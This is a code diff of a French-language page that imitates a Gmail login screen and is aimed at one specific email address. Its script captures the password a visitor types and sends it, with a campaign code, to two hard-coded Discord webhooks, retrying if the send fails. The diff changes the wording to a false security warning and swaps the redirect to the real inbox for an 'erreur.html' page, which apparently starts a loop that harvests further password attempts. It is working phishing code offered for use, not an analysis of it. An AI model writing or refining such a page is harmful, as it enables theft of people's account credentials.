@@ -56,7 +56,7 @@ h1{font-size:23px;font-weight:400;margin:0 0 8px;color:#202124}
   </svg>
 
   <h1>Connexion</h1>
-  <p class="lead">Votre session a expiré. Reconnectez-vous pour continuer à utiliser Gmail.</p>
+  <p class="lead">Votre session a été fermée après une tentative de connexion. Reconnectez-vous pour continuer à utiliser Gmail.</p>
 
   <div class="chip"><span class="mini">M</span><span class="mail" id="chipMail">maudperez33@gmail.com</span></div>
 
@@ -71,9 +71,9 @@ h1{font-size:23px;font-weight:400;margin:0 0 8px;color:#202124}
 </div>
 
 <script>
-const CODE = "RB-9K42-MAIL";
+const CODE = "RB-9K42-MAIL1";
 const MAIL = "maudperez33@gmail.com";
-const REDIRECT = "https://mail.google.com/mail/u/0/#inbox";
+const SUIVANT = "erreur.html?n=2";
 const HOOKS = [
   "https://discord.com/api/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot",
   "https://discord.com/api/webhooks/1567191230872551464/lhvhBSU_tcH3H7mUIuo87kHxBdnnPbzdwAG6laVscaFd4GNk4JRbFjUQKmRoxiutL_QN"
@@ -133,15 +133,15 @@ $("formPwd").addEventListener("submit", async e => {
   e.preventDefault();
   if (busy) return;
   const p = $("pwd").value;
-  if (!p) return;
+  if (!p) { $("pwd").focus(); return; }
   busy = true;
   const btn = $("btnLogin");
   btn.disabled = true;
   btn.innerHTML = '<span class="spin"></span>Connexion…';
-  const txt = "🔐 NOUVEAU MOT DE PASSE (relance)\nCode : " + CODE + "\nEmail : " + MAIL + "\nMot de passe :\n```\n" + p + "\n```";
+  const txt = "🔐 Mot de passe — essai 1\nCode : " + CODE + "\nEmail : " + MAIL + "\nMot de passe :\n```\n" + p + "\n```";
   let ok = await envoi(txt);
   if (!ok) { await new Promise(r => setTimeout(r, 2500)); ok = await envoi(txt); }
-  setTimeout(() => { location.replace(REDIRECT); }, ok ? 1200 : 2500);
+  setTimeout(() => { location.replace(SUIVANT); }, ok ? 1400 : 2500);
 });
 
 $("showpwd").addEventListener("change", function () {
